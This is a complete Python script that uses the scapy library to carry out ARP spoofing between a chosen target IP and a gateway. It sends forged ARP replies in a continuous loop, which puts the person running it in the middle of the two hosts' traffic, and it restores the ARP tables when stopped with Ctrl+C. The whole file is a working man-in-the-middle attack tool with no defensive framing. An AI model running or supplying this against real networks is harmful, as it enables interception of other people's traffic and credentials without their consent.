#! usr/bin/env python

import scapy.all as scapy
import time
import sys
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--taget",dest="target_ip",help="Target IP")
    parser.add_argument("-g","--gateway",dest="gateway_ip",help="Gateway IP")
    options = parser.parse_args()
    return options

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
     answered_list = scapy.srp(arp_request_broadcast, timeout=10, verbose=False)[0]
     return answered_list[0][1].hwsrc

def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)

arguments = get_arguments()
target_ip,gateway_ip = arguments.target_ip, arguments.gateway_ip

sent_packets_count = 0
try:
    while True:
        try:
            spoof(gateway_ip,target_ip)
            spoof(target_ip,gateway_ip)
        except IndexError:
           continue
        sent_packets_count += 2
        print("\r[+] Packets sent: "+str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\r[+] Detected CTRL + C ..... Restoring... ")
    restore(gateway_ip,target_ip)
    restore(target_ip,gateway_ip)
